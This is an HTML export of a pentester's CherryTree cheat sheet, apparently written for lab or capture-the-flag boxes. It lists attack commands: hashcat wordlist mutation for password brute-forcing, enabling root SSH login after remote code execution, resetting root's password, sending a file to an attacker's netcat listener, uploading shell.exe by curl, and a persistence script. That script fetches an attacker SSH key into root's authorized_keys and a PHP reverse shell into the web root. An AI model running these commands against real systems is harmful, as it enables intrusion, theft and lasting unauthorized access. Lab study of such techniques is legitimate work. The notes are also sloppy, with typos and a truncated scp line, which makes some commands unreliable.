<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>13-linux tricks</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>13-linux tricks</h1><br/><p><h2> bruteforce </h2><strong><h3> </h3></strong><ul><li><h3>create a list and mutate element with hashcat</h3></li></ul><h3></h3></p><p><h3> </h3>• <h3>◇ hashcat --force &lt;dict file&gt; -r /usr/share/hashcat/rules/best64.rule --stdout &gt; result_dict.txt</h3><h3></h3></p><p><h3> </h3></p><p><ul><li><h3>hashcat rules files</h3></li><li><h3>◇ each line is a rule applied to a file</h3></li></ul><h3></h3></p><p><h3> ◇ T0 == lowercase index 0</h3><h3></h3></p><p><h3> ◇ : == do nothing </h3><h3></h3></p><p><h3> ◇ r ===  </h3><h3></h3></p><p><h3> ◇ u === uppercase</h3><h3></h3></p><p><h3> ◇ $0 == append 0 </h3><h3></h3></p><p><h3> </h3>◇ <h3>$0 $0 == append 00</h3></p><p></p><p></p><p></p><p><h2>Allow SSH after RCE: </h2><ul><li><h3>change passwd or get the password</h3></li><li>◇ <h3>◇ /etc/init.d/ssh start</h3></li></ul><h3></h3></p><p><h3> ◇  by default ssh login for user root is disabled by</h3><h3></h3></p><p><h3> ◇ grep -i root /etc/ssh/sshd_config</h3><h3></h3></p><p><h3> ◇ Append the following line to the SSH config to allow root login with password :</h3><h3></h3></p><p><h3> ◇ ▪  PermitRootLogin yes</h3><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3> ◇  /etc/init.d/ssh start \# restart ssh</h3><h3></h3></p><p><h3> </h3></p><p><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3></h3><h2>  change password of root</h2></p><p> ◇ <h3> echo &quot;root:password&quot; |/usr/bin/chpasswd</h3></p><p></p><p><h3></h3></p><p><h3></h3><h2>generating keys for RSA</h2><h3></h3></p><p><h3> ssh-keygen -t rsa -b 4096 -m PEM -f jwtRS256.key</h3><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3> </h3><h2>download  a file from  shell with nc</h2><h3></h3></p><p><h3> * victim : nc 10.10.14.4 5555 -w 3 &lt; ./linpeas.log</h3><h3></h3></p><p><h3> * attacker : nc -lvp 5555 &gt; linpeas.log</h3><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3></h3><h2> run local ftp server</h2></p><p> ◇ <h3> python -m pyftpdlib -p21 -w</h3></p><p></p><p><h3> </h3><h3></h3></p><p><h3></h3><h2> Create custom worlist hashcat </h2></p><p> ◇ <h3> create custom list of common names related pof the box (begin with capital letter)</h3><ul><li>◇ <h3>◇  hashcat --force custom_wordlist -r /usr/share/hashcat/rules/best64.rule --stdout &gt; hashcat_words</h3></li></ul><h3></h3></p><p><h3> </h3></p><p><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3></h3><h3></h3></p><p><h3> </h3></p><p></p><p><h2>Proxying each web exploit via curl (burp proxy)</h2><h3></h3></p><p><h3> curl -x http://10.10.14.44:8080 &lt;url&gt; </h3><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3></h3><em><h2> curl upload</h2></em></p><p> * curl -F &quot;files=@shell.exe&quot; http://10.11.1.123/books/apps/jquery-file-upload/server/php/<h3></h3></p><p><h3></h3><h2> Linux </h2><ul><li> <h3> cd -  // previous work dir </h3></li><li><h3>Convert to linux format</h3><ul><li><h3>dos2unix exploit.py </h3></li></ul></li></ul><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3></h3><h2> Linux_Persistence</h2><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3> </h3><a href="image.png"><img src="images/46-1.png" alt="images/46-1.png" /></a></p><p> </p><p><em><h3>#! /bin/bash</h3></em><em><h3></h3></em></p><p><em><h3> </h3></em><em><h3></h3></em></p><p><em><h3> mkdir /root/.ssh </h3></em><em><h3></h3></em></p><p><em><h3> chmod 600 /root/.ssh</h3></em><em><h3></h3></em></p><p><em><h3> curl 10.10.14.39/youness.pub &gt;&gt;/root/.ssh/authorized_keys </h3></em><em><h3></h3></em></p><p><em><h3> chmod 600 /root/.dssh/authorized_keys</h3></em><em><h3></h3></em></p><p><em><h3> curl 10.10.14.9/srev.php -o /var/www/html/rev.php /rev.php is  shell</h3></em><em><h3></h3></em></p><p><em><h3> // /usr/share/laudanum/php</h3></em><em><h3></h3></em></p><p><em><h3> </h3></em><em><h3></h3></em></p><p><em><h3> </h3></em><em><h3></h3></em></p><p><em><h3> </h3></em><em><h3></h3></em></p><p><em><h3> </h3></em><strong><h2># debug system error</h2></strong><ul><li><h3> sudo journalctl -xe</h3></li><li><h3>cat /var/Log/auth.log</h3></li></ul></p><p></p><p><h2>One line port scanning nc</h2><ul><li><h3>nc -zv 192.168.100.1 1-65535</h3></li><li>TCP<ul><li>nc -nvv -w 1 -z $target $port1-$port2</li></ul></li><li>UDP<ul><li>nc -nv -u -z -w 1 $target $port1-$port2 // range </li></ul></li></ul></p><p></p><p></p><p>Export targets</p><p></p><p></p><p><ul><li>transfer remote file to linux</li><li> -P2222 student@192.168.179.52:/challenge/powershell-uploads ./powershell-uploads</p><p></li></ul></p></div>
</body>
</html>
